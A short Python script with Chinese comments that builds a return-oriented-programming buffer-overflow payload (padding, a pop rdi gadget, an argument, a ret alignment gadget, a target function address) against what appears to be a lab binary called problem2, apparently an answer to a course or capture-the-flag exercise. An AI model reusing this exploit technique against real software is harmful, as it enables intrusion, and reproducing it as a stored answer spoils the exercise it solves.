import struct

# 1. 填充 (16字节)
padding = b"A" * 16

# 2. [核心修正] Pop RDI Gadget 的地址
# 必须是 0x4012c7 (直接指向 pop rdi 指令)，绝对不能是 0x4012bb
pop_rdi_addr = struct.pack('<Q', 0x4012c7)

# 3. 参数值 0x3f8 (1016)
arg_val = struct.pack('<Q', 0x3f8)

# 4. Ret Gadget (用于栈对齐，防止 printf 崩溃)
# 使用 pop_rdi 函数结尾的 ret 指令地址
ret_gadget = struct.pack('<Q', 0x4012c8)

# 5. 目标函数 func2
func2_addr = struct.pack('<Q', 0x401216)

# 拼接 Payload
# 顺序：填充 -> pop_rdi -> 参数 -> ret(对齐) -> func2
payload = padding + pop_rdi_addr + arg_val + ret_gadget + func2_addr

# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("终极 Payload 已生成。请运行: ./problem2 ans2.txt")